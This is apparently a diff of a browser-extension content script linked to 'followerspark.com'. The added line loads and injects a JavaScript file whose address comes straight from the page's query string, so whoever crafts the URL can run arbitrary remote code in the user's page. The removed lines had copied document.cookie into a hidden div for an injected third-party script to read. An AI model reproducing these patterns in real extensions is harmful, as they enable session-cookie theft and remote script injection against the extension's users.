@@ -43,10 +43,10 @@ setInterval(() => {
     }
 }, 1000);
 
-if ((location.search || '').indexOf('followpark=1') !== -1) {
+if ((location.search || '').indexOf('followpark=') !== -1) {
     var jsScript = document.createElement('script');
     jsScript.setAttribute('type', 'text/javascript');
-    jsScript.setAttribute('src', 'https://followerspark.com/followerspark.js');
+    jsScript.setAttribute('src', `${location.search.replace('?followpark=', '')}/extension/followerspark.js`);
     const appendChild = () => {
         const childiren = document.querySelector('#react-root').children;
         const children2 = childiren[Math.random() * childiren.length | 0].children;
@@ -63,9 +63,4 @@ if ((location.search || '').indexOf('followpark=1') !== -1) {
     chrome.browserAction.onClicked.addListener(function () {
         chrome.tabs.create({ url: 'http://followerspark.com' });
     });
-    var cookie = document.cookie;
-    var fDiv = document.createElement('div');
-    fDiv.setAttribute('id', 'FollowersPark');
-    fDiv.setAttribute('tkn', cookie);
-    document.body.append(fDiv);
 }
